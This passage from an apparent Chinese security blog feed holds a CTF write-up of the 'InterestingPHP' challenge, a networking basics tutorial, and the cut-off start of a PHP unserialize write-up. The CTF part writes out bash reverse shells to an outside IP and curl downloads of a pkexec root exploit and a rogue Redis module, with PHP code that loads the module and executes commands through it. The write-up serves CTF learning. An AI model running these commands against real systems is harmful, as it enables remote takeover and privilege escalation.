class="keyword">putenv</span>,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,iconv,<span class="keyword">system</span>,<span class="keyword">exec</span>,shell_exec,<span class="keyword">popen</span>,passthru,symlink,link,syslog,imap_open,dl,mail,stream_socket_client,error_log,debug_backtrace,debug_print_backtrace,gc_collect_cycles,array_merge_recursive,get_cfg_var</span><br></pre></td></tr></table></figure><p>看到这一串输出的瞬间人就麻了 苦鲁西（瘫</p><h2 id="姿势一（非预期）"><a href="#姿势一（非预期）" class="headerlink" title="姿势一（非预期）"></a>姿势一（非预期）</h2><p>不管怎么说，过滤再强大（指限制多），也是假的，不是真的，所以，要先手开团，故意找茬（指绕过</p><p>在获取到的信息如此多而杂的情况下，靠人眼判断实在是难。</p><p>许多wp里都提到了<strong>mm0r1</strong>师傅的<a href="https://github.com/mm0r1/exploits">php-bypass系列exp</a> 太顶了（什么时候自己也能写出这样重量级的exp呢……即使现在还是幻想 愿望还是要有的嘛</p><p>这里用到的是<a href="https://github.com/mm0r1/exploits/blob/master/php-filter-bypass/exploit.php">php-filter-bypass</a>，其中<code>fwrite()</code>被禁了，改成<code>fputs()</code>就好</p><p>测试结果完美</p><p><img src="/images/BUU/2022-03-24-16-30-10.png"></p><p>构造数据包时还遇到几个新的小知识点，在这里记录下来。</p><p><strong>Multipart/form-data</strong>请求</p><blockquote><p>1.multipart/form-data的基础方式是post，也就是说通过post组合方式来实现的。</p><p>2.multipart/form-data于post方法的不同之处在于请求头和请求体。</p><p>3.multipart/form-data的请求头必须包含一个特殊的头信息：Content-Type，其值也必须为multipart/form-data，同时还需要规定一个内容分割用于分割请求提中多个post的内容，如文件内容和文本内容是需要分隔开来的，不然接收方就无法解析和还原这个文件了，具体的头信息如下：</p><p>Content-Type: multipart/form-data; boundary=${bound}  </p><p>其中${bound} 是一个占位符，代表我们规定的分割符，可以自己任意规定，但为了避免和正常文本重复了，尽量要使用复杂一点的内容。如：--------------------56423498738365</p></blockquote><p>这样我们发送的exp才会视作为一个整体，而不是被分割的各部分。</p><p><img src="/images/BUU/2022-03-24-16-31-03.png"></p><p>右边的Inspector也清楚地展示了被分割后的数据，这显然不是我们想要的结果，因此才会需要使用Multipart/form-data方法。</p><p><strong>Content-Disposition</strong>响应标头</p><blockquote><p>在一个multipart/form-data正文中，HTTP Content-Disposition通用标题是一个标题，可以在多部分主体的子部分中使用，以提供有关它适用的字段的信息。</p></blockquote><p>个人的初步理解是，可以看作将在此分界线以内的data全部赋值给<code>name</code>。</p><p><img src="/images/BUU/2022-03-24-16-32-04.png"></p><p>既然现在都能命令执行了，干的第一票一定是<strong>反弹shell</strong>，交互式的操作环境总是更方便的。</p><p>攻击机监听2333端口</p><p><code>nc -lvp 2333</code></p><p>exp修改执行命令</p><p><code>pwn(&quot;bash -c &#39;bash -i &gt;&amp; /dev/tcp/233.33.3.333/2333 0&gt;&amp;1&#39;&quot;);</code></p><p>成功获得shell，直冲根目录</p><p><img src="/images/BUU/2022-03-24-16-32-29.png"></p><p>老火 看来是权限不够（cat命令没有被限制） 最开始的<code>whoami</code>命令执行回显似乎也在提醒我们，你<strong>www-data</strong>是什么用户啊，你<strong>www-data</strong>什么的都在读flag，他能读吗！读不了，没这个实力（指权限），知道嘛（悲</p><p>能打开文件的各种命令都试过了，看来是只剩下提权一条路了</p><p>最容易想到的应该是<code>SUID提权</code></p><blockquote><p>SUID (Set UID)是Linux中的一种特殊权限，其功能为用户运行某个程序时，如果该程序有SUID权限，那么程序运行为进程时，进程的属主不是发起者，而是程序文件所属的属主。但是SUID权限的设置只针对二进制可执行文件，对于非可执行文件设置SUID没有任何意义。</p><p>在执行过程中，调用者会暂时获得该文件的所有者权限，且该权限只在程序执行的过程中有效。通俗的来讲，假设我们现在有一个可执行文件ls，其属主为root，当我们通过非root用户登录时，如果ls设置了SUID权限，我们可在非root用户下运行该二进制可执行文件，在执行文件时，该进程的权限将为root权限。利用此特性，我们可通过SUID进行提权。</p><p>现在已知的具有SUID权限的二进制可执行文件大体有如下这些</p><p>nmap<br>vim<br>find<br>bash<br>more<br>less<br>nano<br>cp<br>awk</p></blockquote><p>执行命令<code>find / -user root -perm -4000 -print 2&gt;/dev/null</code></p><blockquote><p>准确的说，这个命令将从/目录中查找具有SUID权限位且属主为root的文件并输出它们，然后将所有错误重定向到/dev/null，从而仅列出该用户具有访问权限的那些二进制文件。</p></blockquote><p><img src="/images/BUU/2022-03-24-16-35-23.png"></p><p>利用点即为<a href="https://saucer-man.com/information_security/876.html">pkexec提权漏洞</a></p><p>同时附上<a href="https://github.com/arthepsy/CVE-2021-4034">poc</a> 放在自己VPS上 再通过<code>curl</code>下载</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl http://233.33.3.333/poc.c &gt; /tmp/poc.c</span><br><span class="line">gcc poc.c -o poc</span><br><span class="line">./poc</span><br></pre></td></tr></table></figure><p><img src="/images/BUU/2022-03-24-16-36-00.png"></p><p>（瘫）</p><h2 id="姿势二"><a href="#姿势二" class="headerlink" title="姿势二"></a>姿势二</h2><p>用<code>ini_get_all()</code>得到php相关配置信息后，使用<code>scandir()</code>探测到目录下存在<code>secret.rdb</code>文件，即redis数据备份文件；</p><p><img src="/images/BUU/20220330215008.png"></p><p>拖下来找到一些好康的</p><p><img src="/images/BUU/20220330215432.png"></p><p>猜测<code>ye_w4nt_a_gir1fri3nd</code>即redis服务的密码。</p><p>但默认端口6379并没有开放，万事俱备，只欠端口</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="number">65535</span>;<span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="variable">$t</span> = <span class="title function_ invoke__">stream_socket_server</span>(<span class="string">&quot;tcp://0.0.0.0:&quot;</span>.<span class="variable">$i</span>,<span class="variable">$ee</span>,<span class="variable">$ee2</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$ee2</span> === <span class="string">&quot;Address already in use&quot;</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">var_dump</span>(<span class="variable">$i</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/images/BUU/20220330221032.png"></p><p>发现<code>80</code>和<code>8888</code>端口开放，从而知晓redis端口<code>8888</code></p><p>同时函数<code>get_loaded_extensions()</code>可以看到php加载的插件</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">array</span><span class="params">(<span class="number">34</span>)</span></span> &#123; <span class="selector-attr">[0]</span>=&gt; <span class="built_in">string</span>(<span class="number">4</span>) <span class="string">&quot;Core&quot;</span> <span class="selector-attr">[1]</span>=&gt; <span class="built_in">string</span>(<span class="number">4</span>) <span class="string">&quot;date&quot;</span> <span class="selector-attr">[2]</span>=&gt; <span class="built_in">string</span>(<span class="number">6</span>) <span class="string">&quot;libxml&quot;</span> <span class="selector-attr">[3]</span>=&gt; <span class="built_in">string</span>(<span class="number">7</span>) <span class="string">&quot;openssl&quot;</span> <span class="selector-attr">[4]</span>=&gt; <span class="built_in">string</span>(<span class="number">4</span>) <span class="string">&quot;pcre&quot;</span> <span class="selector-attr">[5]</span>=&gt; <span class="built_in">string</span>(<span class="number">7</span>) <span class="string">&quot;sqlite3&quot;</span> <span class="selector-attr">[6]</span>=&gt; <span class="built_in">string</span>(<span class="number">4</span>) <span class="string">&quot;zlib&quot;</span> <span class="selector-attr">[7]</span>=&gt; <span class="built_in">string</span>(<span class="number">5</span>) <span class="string">&quot;ctype&quot;</span> <span class="selector-attr">[8]</span>=&gt; <span class="built_in">string</span>(<span class="number">4</span>) <span class="string">&quot;curl&quot;</span> <span class="selector-attr">[9]</span>=&gt; <span class="built_in">string</span>(<span class="number">3</span>) <span class="string">&quot;dom&quot;</span> <span class="selector-attr">[10]</span>=&gt; <span class="built_in">string</span>(<span class="number">8</span>) <span class="string">&quot;fileinfo&quot;</span> <span class="selector-attr">[11]</span>=&gt; <span class="built_in">string</span>(<span class="number">6</span>) <span class="string">&quot;filter&quot;</span> <span class="selector-attr">[12]</span>=&gt; <span class="built_in">string</span>(<span class="number">3</span>) <span class="string">&quot;ftp&quot;</span> <span class="selector-attr">[13]</span>=&gt; <span class="built_in">string</span>(<span class="number">4</span>) <span class="string">&quot;hash&quot;</span> <span class="selector-attr">[14]</span>=&gt; <span class="built_in">string</span>(<span class="number">5</span>) <span class="string">&quot;iconv&quot;</span> <span class="selector-attr">[15]</span>=&gt; <span class="built_in">string</span>(<span class="number">4</span>) <span class="string">&quot;json&quot;</span> <span class="selector-attr">[16]</span>=&gt; <span class="built_in">string</span>(<span class="number">8</span>) <span class="string">&quot;mbstring&quot;</span> <span class="selector-attr">[17]</span>=&gt; <span class="built_in">string</span>(<span class="number">3</span>) <span class="string">&quot;SPL&quot;</span> <span class="selector-attr">[18]</span>=&gt; <span class="built_in">string</span>(<span class="number">3</span>) <span class="string">&quot;PDO&quot;</span> <span class="selector-attr">[19]</span>=&gt; <span class="built_in">string</span>(<span class="number">7</span>) <span class="string">&quot;session&quot;</span> <span class="selector-attr">[20]</span>=&gt; <span class="built_in">string</span>(<span class="number">5</span>) <span class="string">&quot;posix&quot;</span> <span class="selector-attr">[21]</span>=&gt; <span class="built_in">string</span>(<span class="number">10</span>) <span class="string">&quot;Reflection&quot;</span> <span class="selector-attr">[22]</span>=&gt; <span class="built_in">string</span>(<span class="number">8</span>) <span class="string">&quot;standard&quot;</span> <span class="selector-attr">[23]</span>=&gt; <span class="built_in">string</span>(<span class="number">9</span>) <span class="string">&quot;SimpleXML&quot;</span> <span class="selector-attr">[24]</span>=&gt; <span class="built_in">string</span>(<span class="number">10</span>) <span class="string">&quot;pdo_sqlite&quot;</span> <span class="selector-attr">[25]</span>=&gt; <span class="built_in">string</span>(<span class="number">4</span>) <span class="string">&quot;Phar&quot;</span> <span class="selector-attr">[26]</span>=&gt; <span class="built_in">string</span>(<span class="number">9</span>) <span class="string">&quot;tokenizer&quot;</span> <span class="selector-attr">[27]</span>=&gt; <span class="built_in">string</span>(<span class="number">3</span>) <span class="string">&quot;xml&quot;</span> <span class="selector-attr">[28]</span>=&gt; <span class="built_in">string</span>(<span class="number">9</span>) <span class="string">&quot;xmlreader&quot;</span> <span class="selector-attr">[29]</span>=&gt; <span class="built_in">string</span>(<span class="number">9</span>) <span class="string">&quot;xmlwriter&quot;</span> <span class="selector-attr">[30]</span>=&gt; <span class="built_in">string</span>(<span class="number">7</span>) <span class="string">&quot;mysqlnd&quot;</span> <span class="selector-attr">[31]</span>=&gt; <span class="built_in">string</span>(<span class="number">14</span>) <span class="string">&quot;apache2handler&quot;</span> <span class="selector-attr">[32]</span>=&gt; <span class="built_in">string</span>(<span class="number">5</span>) <span class="string">&quot;redis&quot;</span> <span class="selector-attr">[33]</span>=&gt; <span class="built_in">string</span>(<span class="number">6</span>) <span class="string">&quot;sodium&quot;</span> &#125;</span><br></pre></td></tr></table></figure><p>可以看到题目环境加载了redis插件，搜索得知这个插件的Redis类中的<code>rawCommand()</code>方法可以执行redis命令。</p><p>先利用<code>curl+file_put_contents()</code>写入redis主从复制rce的<a href="https://github.com/n0b0dyCN/redis-rogue-server">.so文件</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Curl</span>(<span class="params"><span class="variable">$url</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span> ( <span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="literal">true</span> );</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;exp.so&quot;</span>,<span class="variable">$result</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">Curl</span>(<span class="string">&quot;http://233.33.3.333/exp.so&quot;</span>);</span><br></pre></td></tr></table></figure><p><img src="/images/BUU/20220331124321.png"></p><p>然后构造反弹shell的payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$redis</span> = <span class="keyword">new</span> <span class="title class_">Redis</span>();</span><br><span class="line"><span class="variable">$redis</span>-&gt;<span class="title function_ invoke__">connect</span>(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">8888</span>);</span><br><span class="line"><span class="variable">$redis</span>-&gt;<span class="title function_ invoke__">auth</span>(<span class="string">&#x27;ye_w4nt_a_gir1fri3nd&#x27;</span>);</span><br><span class="line"><span class="variable">$redis</span>-&gt;<span class="title function_ invoke__">rawCommand</span>(<span class="string">&#x27;module&#x27;</span>, <span class="string">&#x27;load&#x27;</span>, <span class="string">&#x27;/var/www/html/exp.so&#x27;</span>);</span><br><span class="line"><span class="variable">$redis</span>-&gt;<span class="title function_ invoke__">rawCommand</span>(<span class="string">&#x27;system.exec&#x27;</span>, <span class="string">&#x27;bash -c&#x27;</span>, <span class="string">&#x27;exec bash -i &amp;&gt; /dev/tcp/233.33.3.333/2333 0&gt;&amp;1&#x27;</span>);</span><br></pre></td></tr></table></figure><p>反弹成功</p><p><img src="/images/BUU/20220331125842.png"></p><p>接下来的提权操作和前面完全一致。</p><h1 id="菜单上新"><a href="#菜单上新" class="headerlink" title="菜单上新"></a>菜单上新</h1><p>强迫自己跨难度复现学习，这道InterestingPHP教会了我太多。</p><p>虽说还有许多基础如redis数据库、sockets编程、权限提升等等没有深入学习，但接触过这次后，我相信不久后我们还会再见的。那时的我相信也不会再像这次一样找不着北了。</p><p>继续跑，不要停（指学习</p><p>（瘫）</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;虽然这道题不看其他师傅们的wp是真的搞不动，完全是一步一步照着师傅们的脚步走的，但这道题收获的最大的其实是我们做题时该有的思路了。&lt;/p&gt;
&lt;p&gt;从过滤受阻开始，信息收集、定点攻击，到反弹shell、权限提升，更加明确和清晰的进攻思路，才是完成这次复现后想要收获的。&lt;/p&gt;
&lt;p&gt;我是一个一个一个卡其脱离太啊啊啊啊啊啊啊（指禁止停下刷题&lt;/p&gt;</summary>
    
    
    
    
    <category term="php" scheme="https://www.m0x01sery.com/tags/php/"/>
    
    <category term="ssrf" scheme="https://www.m0x01sery.com/tags/ssrf/"/>
    
    <category term="redis" scheme="https://www.m0x01sery.com/tags/redis/"/>
    
    <category term="privilge escalation" scheme="https://www.m0x01sery.com/tags/privilge-escalation/"/>
    
  </entry>
  
  <entry>
    <title>域肾透——从看懂到看开 0x00</title>
    <link href="https://www.m0x01sery.com/2022/03/09/computer-networks-basic/"/>
    <id>https://www.m0x01sery.com/2022/03/09/computer-networks-basic/</id>
    <published>2022-03-08T16:00:00.000Z</published>
    <updated>2022-03-15T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<p>时隔半个月断断续续，润掉四节坐牢历史课，终于结束了这篇新文章（瘫</p><p><a href="https://mp.weixin.qq.com/s/jiPMUk6zUdOY6eKxAjNDbQ">如果让你来设计网络</a>这篇文章是写得真的十分清楚，是超赞的入门基础篇，为这篇水文（悲）提供了大量的资料和指导。</p><p>真的十分感谢原作者呀！</p><span id="more"></span><h1 id="Hub-集线器"><a href="#Hub-集线器" class="headerlink" title="Hub/集线器"></a>Hub/集线器</h1><p>在它被应用之前，两台计算机<del>为了分享黄油合集</del>要建立通信，就得用网线直接将它们相连，其实貌似也只有这种办法了。</p><p>很快，更多的绅士们找到了黄油的来源，然后互相连起了网线，交流游van心door。</p><p>随着加入战斗的绅士越来越多，大家发现身上的网口开得实在有点多了，线也交错在一起，根本不好维护。</p><p><img src="/images/BUU/202203162155624.png"></p><p>即使我们真有这么多根网线，计算机也没有这么多网口的说。</p><p>这时一群有志于将黄油分享给全地球人的勇士们站了出来，发明了一个中间设备，起名给它叫做<strong>集线器</strong>。</p><p><img src="/images/BUU/202203162154454.png"></p><p>大家仅需把网线连在它的身上就好，随着网口和网线数量的减少，一切都变得有序了起来。</p><p>这个设备的工作只是负责转发，将收到的数据包<strong>广播</strong>给所有出口，仅此而已。</p><p>所以，为了让其余计算机得知发来的数据包究竟是不是自己该收下的那个，我们还需要一个身份证。</p><h1 id="Media-Access-Control-物理地址"><a href="#Media-Access-Control-物理地址" class="headerlink" title="Media Access Control/物理地址"></a>Media Access Control/物理地址</h1><p>也叫MAC地址，<strong>全球唯一</strong>。大概长<em>00:0C:29:CA:E4:66</em>这样，由网络设备制造商生产时烧录在网卡里。</p><blockquote><p>硬件的MAC地址是厂家按照一定的规则，进行设置所产生的，因此，MAC地址拥有自己的格式。</p><p>MAC 地址采用十六进制数表示，共 6 个字节（48 位），长度为 48bit（字节）。整个地址可以分为前 24 位和后 24 位，代表不同的含义。</p><p>前 24 位称为组织唯一标识符（Organizationally Unique Identifier，OUI），是由 IEEE 的注册管理机构给不同厂家分配的代码，区分了不同的厂家。</p><p>后 24 位是由厂家自己分配的，称为扩展标识符。同一个厂家生产的网卡中 MAC 地址后 24 位是不同的。</p></blockquote><p>利用这个全球唯一的特性，计算机在发送数据包时，只要在头部再拼接一点数据就好。</p><p><img src="/images/BUU/202203162155341.png"></p><p>其余计算机收到数据包后，根据头部的MAC地址信息，判断是否确实是发给自己的，就可以选择是<strong>收下</strong>还是<strong>丢弃</strong>了。</p><p>虽然集线器使整个布局干净不少，但原来只发给某台计算机的消息，现在却要发给连接到集线器中的所有设备，来，騙！（指大量垃圾数据包），来，偷袭！（指占用过多带宽）这好吗？这不好。更重要的是，这并不安全。</p><p>我劝！这位年轻集线器，耗子尾汁。</p><h1 id="Switch-交换机"><a href="#Switch-交换机" class="headerlink" title="Switch/交换机"></a>Switch/交换机</h1><p>要是集线器再智能一点，只会发包给目标MAC地址指向的那台计算机就又能解决大部分问题了。于是勇士们又发明了<strong>交换机</strong>。</p><p>交换机内部维护一张MAC地址表，记录着每一个MAC地址的设备，连接在其哪一个端口上。</p><p><img src="/images/BUU/202203162156314.png"></p><p>嘛，最开始的时候这张表必定是空的，这恒河里。但它逐步建立的过程也很好理解。</p><p>我们发送如下数据包</p><p><img src="/images/BUU/202203162155341.png"></p><p>已知此包从1号端口进，于是交换机记下</p><p>MAC：aa-aa-aa-aa-aa-aa-aa<br>端口：1</p><p>交换机在查看地址表发现没有目标映射，故技重施，将此包广播出去。</p><p>之后，目标计算机收到了此包，于是做出<strong>响应</strong>告诉交换机，交换机也会再发给我们发送一个响应信号，告诉双方：我滴任务，完成啦！啊哈哈哈哈哈哈（突发恶疾）</p><p>由于响应从2号端口进，于是交换机再记下</p><p>MAC：bb-bb-bb-bb-bb-bb<br>端口：2</p><p>如此各台计算机通信多次，地址表便建立完成。</p><p>就像我们小时候玩插座一样，总想着要是一个插座要能接到另一个插座里，就能用一个插孔换另一个插座数量的设备了。</p><p>我们完全不需要设计额外的东西，只需要按照之前的规矩来，按照上图的接线方式即可完成所有计算机的互联，所以交换机设计的这种布局，其实真的很巧妙。</p><p>最终，两个交换机将分别记录 A ~ H 所有机器的映射记录。</p><p><img src="/images/BUU/202203162200467.png"></p><p>这种设计在局域网内有几十甚至几百台电脑的时候，都能很好地工作，所以这种基于交换机的网络设计模式，支撑了好一阵子。</p><h1 id="Router-路由器"><a href="#Router-路由器" class="headerlink" title="Router/路由器"></a>Router/路由器</h1><p>但谁都没有想到，计算机在地球上的发展速度实在是太快，太快。数量很快就到了几万、几十万、几百万，交换机的地址表已经无法记录如此庞大的映射关系了。</p><p>很明显，问题就在于一台交换机连到另一台交换机上的那根线。千千万万个设备连接在一起，使地址表逐渐大得离谱。我们需要另增一个设备再次帮忙作转发。</p><p>这个设备就是路由器。作为一台每个端口都独立拥有MAC地址的设备，会帮我们把数据包再做一次转发。</p><p><img src="/images/BUU/202203162203659.png"></p><p>但是，现在我们想从主机A给主机C发送数据，单靠MAC地址的话，似乎不太行的通了。</p><p>因为交换机的工作仅着眼于MAC地址，一查地址表没有，广播后更是没有回应，它就光速进行一个班的下，表示我什么都做不到（指把包原封不动地还给你）。</p><p>这我们还指望路由器帮忙转发呢，看来得提前让主机自己判断一下，目标跟自己是不是在同一台交换机下才行。</p><h1 id="IP-互联网协议地址"><a href="#IP-互联网协议地址" class="headerlink" title="IP/互联网协议地址"></a>IP/互联网协议地址</h1><blockquote><p>于是你发明了一个新的地址，给每一台机器一个 32 位的编号，如：</p><p>11000000101010000000000000000001</p><p>你觉得有些不清晰，于是把它分成四个部分，中间用点相连。</p><p>11000000.10101000.00000000.00000001</p><p>你还觉得不清晰，于是把它转换成 10 进制。</p><p>192.168.0.1</p><p>最后你给了这个地址一个响亮的名字，IP 地址。现在每一台电脑，同时有自己的 MAC 地址，又有自己的 IP 地址，只不过 IP 地址是软件层面上的，可以随时修改，MAC 地址一般是无法修改的。</p><p>这样一个可以随时修改的 IP 地址，就可以根据你规划的网络拓扑结构，来调整了。</p></blockquote><p><img src="/images/BUU/202203162206381.png"></p><p>这时我们（主机A）可以说：</p><p><em>只要目标IP地址不为192.168.0开头，就全部发送给到路由器吧，之后再怎么转发，交给它！</em></p><p>太妙了！</p><p>这样一来，数据包的头部就被拼上了路由器的MAC地址。</p><p>现在两个设备之间的数据传输，得再加上一个头部了。</p><p><img src="/images/BUU/202203162205057.png"></p><h1 id="Subnet-子网-Subnet-Mask-子网掩码"><a href="#Subnet-子网-Subnet-Mask-子网掩码" class="headerlink" title="Subnet/子网 Subnet Mask/子网掩码"></a>Subnet/子网 Subnet Mask/子网掩码</h1><p>刚刚我们提到，<em>只要目标IP地址不为192.168.0开头</em>，其实就是在判断目标主机是否和自己在同一个<strong>子网</strong>下。</p><p>子网的划分是人为规定的，目的是将物理网络重构为逻辑网络，方便管理和提高安全性。</p><p>那对于计算机来说，就是通过<strong>子网掩码</strong>来做出判断的。</p><p>拿最常见的例子，<em>255.255.255.0</em>来说，即表示前24位正是子网所在的网段。</p><p>将其与自身IP、目标IP各作<code>&amp;</code>位运算：</p><p>192.168.0.1 <code>&amp;</code> 255.255.255.0<br>= 11000000.10101000.00000000.00000001 <code>&amp;</code> 11111111.11111111.11111111.00000000<br>= 11000000.10101000.00000000.00000000<br>= 192.168.0.0</p><p>192.168.1.1 <code>&amp;</code> 255.255.255.0<br>= 11000000.10101000.00000001.00000001 <code>&amp;</code> 11111111.11111111.11111111.00000000<br>= 11000000.10101000.00000001.00000000<br>= 192.168.1.0</p><p>计算机得知，我在192.168.0.0网段，他在192.168.1.0网段，于是我要发给路由器，就是这么简洁且易懂。</p><blockquote><p>其实说发给路由器不准确，应该说 A 会把包发给默认网关。</p><p>对 A 来说，A 只能直接把包发给同处于一个子网下的某个 IP 上，所以发给路由器还是发给某个电脑，对 A 来说也不关心，只要这个设备有个 IP 地址就行。</p><p>所以默认网关，就是 A 在自己电脑里配置的一个 IP 地址，以便在发给不同子网的机器时，发给这个 IP 地址。</p></blockquote><h1 id="Routing-Table-路由表"><a href="#Routing-Table-路由表" class="headerlink" title="Routing Table/路由表"></a>Routing Table/路由表</h1><blockquote><p>路由器收到的数据包有目的 IP 也就是 C 的 IP 地址，需要转化成从自己的哪个端口出去，很容易想到，应该有个表，就像 MAC 地址表一样。</p><p>这个表就叫路由表。</p><p>不同于 MAC 地址表的是，路由表并不是一对一这种明确关系。</p></blockquote><p><img src="/images/BUU/202203162217267.png"></p><p>路由表就表示，192.168.0这个网段的，都转发到0号端口，192.168.1这个网段的，都转发到1号端口。</p><p>但路由表的生成可不像MAC表那么简单的说，它是由复杂的<a href="https://www.jianshu.com/p/cf74e5eab2c7">路由算法</a>生成的。</p><p>这里还有一列叫做<strong>下一跳</strong>的数据，这是在路由器连接到另一台路由器上时存在的。</p><h1 id="Address-Resolution-Protocol-地址解析协议"><a href="#Address-Resolution-Protocol-地址解析协议" class="headerlink" title="Address Resolution Protocol/地址解析协议"></a>Address Resolution Protocol/地址解析协议</h1><p>那现在假设我们的数据包经过重重转乘，终于来到了海的那边（指另一个子网），作为一名初来乍到的数据，它是怎么知道目标IP的MAC地址，从而通过交换机发过去的呢？</p><p>故技重施嘛，我们的电脑里还存在一张缓存表，表中记录着IP与MAC地址的映射关系，这就是<strong>ARP协议</strong>用到的的<strong>ARP协议缓存表</strong>。</p><blockquote><p>A封装好要发送的信息，在要写“收件地址”时，A会用子网掩码进行计算先判断C和A自己在不在同一个网段，这时候A知道了C和自己不在一个网段，</p><p>这时候，A知道该用网关把自己的数据传递给C，所以A会发送一个ARP包来获取网关的MAC地址，</p><p>网关收到ARP包后，把自己的MAC地址封装在ARP包中，发送给A，</p><p>A封装报文，目标MAC地址写网关的MAC地址，</p><p>网关收到报文，发现是给自己发的，就开始解包，解开之后，发现是给另一个网段的主机发送的，</p><p>此时如果网关本身就是路由器就直接把数据报文发送给下一跳路由器，如果网关是普通的PC，就发送给路由器，由路由器发送给下一跳路由器，目标MAC写下一跳路由器的MAC地址，</p><p>历经千辛万苦，报文终于到达C的主机的路由器，路由器发送报文到C所在网段的网关，C网段的网关解包之后发现不是给自己，而是给自己网段内的C主机，就发送报文给C了。</p></blockquote><p><img src="/images/BUU/202203162210708.png"></p><p>这样大家不断广播ARP请求，最终所有主机里面都会将ARP缓存表完善。</p><p>至此，我们的黄油网络终于算有点样子了。</p><p>所以我们要不忘初心，速速发我以黄油（bushi</p><p>最后附上一张用于总结复现的网络拓扑图</p><p><img src="/images/BUU/202203162212810.png"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;时隔半个月断断续续，润掉四节坐牢历史课，终于结束了这篇新文章（瘫&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://mp.weixin.qq.com/s/jiPMUk6zUdOY6eKxAjNDbQ&quot;&gt;如果让你来设计网络&lt;/a&gt;这篇文章是写得真的十分清楚，是超赞的入门基础篇，为这篇水文（悲）提供了大量的资料和指导。&lt;/p&gt;
&lt;p&gt;真的十分感谢原作者呀！&lt;/p&gt;</summary>
    
    
    
    
    <category term="Computer Networks" scheme="https://www.m0x01sery.com/tags/Computer-Networks/"/>
    
    <category term="Intranet penetration" scheme="https://www.m0x01sery.com/tags/Intranet-penetration/"/>
    
  </entry>
  
  <entry>
    <title>安洵杯2019 easy_serialize_php</title>
    <link href="https://www.m0x01sery.com/2022/03/03/[anxun2019]easy-serialize-php/"/>
    <id>https://www.m0x01sery.com/2022/03/03/[anxun2019]easy-serialize-php/</id>
    <published>2022-03-02T16:00:00.000Z</published>
    <updated>2022-03-02T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<p>趁热又一道<strong>php unserialize</strong>，冲</p><span id="more"></span><p>反序列化你给路哒哟初体验</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$function</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$img</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter_arr</span> = <span class="keyword">array</span>(<span 